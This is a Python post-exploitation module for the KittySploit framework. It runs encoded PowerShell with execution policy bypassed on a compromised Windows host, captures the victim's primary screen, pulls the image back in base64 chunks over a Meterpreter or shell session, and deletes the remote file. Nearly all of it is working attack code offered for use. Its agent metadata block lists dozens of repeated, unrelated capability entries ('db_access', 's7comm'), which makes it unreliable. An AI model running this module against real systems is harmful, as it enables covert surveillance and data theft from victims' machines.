#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Capture the primary Windows desktop to a PNG on the target, then download it
through the current shell or Meterpreter session and save it under ./output.
"""

from kittysploit import *
import base64
import os
import re
import time

_LOCAL_OUT = "output"
_FILE_MARKER = "__KS_FILE__:"


class Module(Post):
    _AUTO_CLEANUP = True

    __info__ = {
        "name": "Windows Take Screenshot",
        "description": (
            "Capture the primary monitor desktop to a PNG file on a Windows shell "
            "or Meterpreter session, then download the image through the session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1113/",
        ],
        "tags": ["screenshot", "powershell", "screen"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    out_dir = OptString("", "Remote directory for screenshot.png (default: %TEMP%)", False)
    chunk_kb = OptInteger(100, "Chunk size in kilobytes for session reads", False)

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(
            "powershell -NoP -NonI -ExecutionPolicy Bypass -EncodedCommand " + encoded
        )

    def _remote_temp_dir(self) -> str:
        if str(self.out_dir or "").strip():
            return str(self.out_dir).strip().rstrip("\\")
        output = self._execute_cmd("echo %TEMP%")
        if output:
            return output.splitlines()[0].strip().rstrip("\\")
        return "C:\\Windows\\Temp"

    def _ps_single_quote(self, value: str) -> str:
        return str(value).replace("'", "''")

    def _powershell_script(self, output_dir: str) -> str:
        out = self._ps_single_quote(output_dir)
        return f"""
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Get-ScreenResolution {{
    [System.Windows.Forms.Screen]::AllScreens | ForEach-Object {{
        [PSCustomObject]@{{
            DeviceName       = $_.DeviceName
            Width            = $_.Bounds.Width
            Height           = $_.Bounds.Height
            IsPrimaryMonitor = $_.Primary
        }}
    }}
}}

function Capture-Screen {{
    param (
        [System.Drawing.Rectangle]$Bounds,
        [string]$Path
    )
    $bmp = New-Object System.Drawing.Bitmap($Bounds.Width, $Bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($Bounds.Location, [System.Drawing.Point]::Empty, $Bounds.Size)
    $bmp.Save($Path, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bmp.Dispose()
}}

$OutputDir = '{out}'
if (-not (Test-Path -LiteralPath $OutputDir)) {{
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
}}

$primaryScreen = Get-ScreenResolution | Where-Object {{ $_.IsPrimaryMonitor -eq $true }} | Select-Object -First 1
if (-not $primaryScreen) {{
    throw 'No primary monitor detected'
}}

$bounds = [System.Drawing.Rectangle]::FromLTRB(0, 0, $primaryScreen.Width, $primaryScreen.Height)
$screenshotPath = Join-Path -Path $OutputDir -ChildPath 'screenshot.png'
Capture-Screen -Bounds $bounds -Path $screenshotPath
Write-Output ('{_FILE_MARKER}' + $screenshotPath)
"""

    def _int_opt(self, val, default, minimum=None):
        try:
            n = int(val)
        except Exception:
            n = default
        if minimum is not None and n < minimum:
            n = minimum
        return n

    def _remote_file_size(self, path: str) -> int:
        pq = self._ps_single_quote(path)
        ps = f"(Get-Item -LiteralPath '{pq}').Length"
        out = self._run_powershell(ps).strip()
        if not out:
            return 0
        tail = out.splitlines()[-1].strip()
        try:
            return int(tail)
        except ValueError:
            digits = re.sub(r"\D", "", tail)
            return int(digits) if digits else 0

    def _read_remote_chunk_b64(self, path: str, offset: int, length: int) -> bytes:
        pq = self._ps_single_quote(path)
        ps = f"""$fs = [IO.File]::OpenRead('{pq}')
try {{
  $null = $fs.Seek({int(offset)}, [IO.SeekOrigin]::Begin)
  $buf = New-Object byte[] {int(length)}
  $n = $fs.Read($buf, 0, {int(length)})
  if ($n -le 0) {{ '' }} else {{ [Convert]::ToBase64String($buf, 0, $n) }}
}} finally {{
  $fs.Close()
}}"""
        out = self._run_powershell(ps)
        clean = re.sub(r"\s+", "", out)
        if not clean:
            return b""
        return base64.b64decode(clean)

    def _pull_file_via_session(self, remote_path: str, local_path: str) -> bool:
        size = self._remote_file_size(remote_path)
        if size <= 0:
            print_error(f"Remote screenshot is missing or empty: {remote_path}")
            return False

        chunk = max(1024, self._int_opt(self.chunk_kb, 100, None) * 1024)
        parts = []
        offset = 0
        while offset < size:
            n = min(chunk, size - offset)
            blob = self._read_remote_chunk_b64(remote_path, offset, n)
            if len(blob) != n:
                print_error(f"Chunk read mismatch at offset {offset} (expected {n} bytes, got {len(blob)}).")
                return False
            parts.append(blob)
            offset += n

        parent = os.path.dirname(os.path.abspath(local_path))
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(local_path, "wb") as f:
            f.write(b"".join(parts))
        return True

    def _parse_remote_file(self, output: str) -> str:
        for line in output.splitlines():
            line = line.strip()
            if line.startswith(_FILE_MARKER):
                return line[len(_FILE_MARKER):].strip()
        return ""

    def _cleanup_remote(self, path: str) -> None:
        if not path:
            return
        self._execute_cmd(f'del /f /q "{path}"')

    def check(self):
        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
        if "1" not in ps_check:
            print_error("PowerShell is not available on the target")
            return False
        return True

    def run(self):
        if not self.check():
            raise ProcedureError(FailureType.NotCompatible, "PowerShell is not available on the target")

        temp_dir = self._remote_temp_dir()
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_path = os.path.join(_LOCAL_OUT, f"screenshot_{stamp}.png")
        os.makedirs(_LOCAL_OUT, exist_ok=True)

        print_status("Capturing primary monitor screenshot...")
        result = self._run_powershell(self._powershell_script(temp_dir))
        remote_path = self._parse_remote_file(result)

        if not remote_path:
            if re.search(r"(Exception|failed|No primary monitor)", result, re.I):
                print_error(result or "Screenshot capture failed without output")
                raise ProcedureError(FailureType.Unknown, "Screenshot capture failed")
            raise ProcedureError(FailureType.Unknown, "No screenshot path was returned")

        if not self._pull_file_via_session(remote_path, local_path):
            if self._AUTO_CLEANUP:
                self._cleanup_remote(remote_path)
            raise ProcedureError(FailureType.Unknown, f"Failed to download {remote_path}")

        if self._AUTO_CLEANUP:
            self._cleanup_remote(remote_path)

        rel = os.path.join(".", local_path)
        print_success(f"Screenshot saved: {rel} ({os.path.getsize(local_path)} bytes)")
        return True
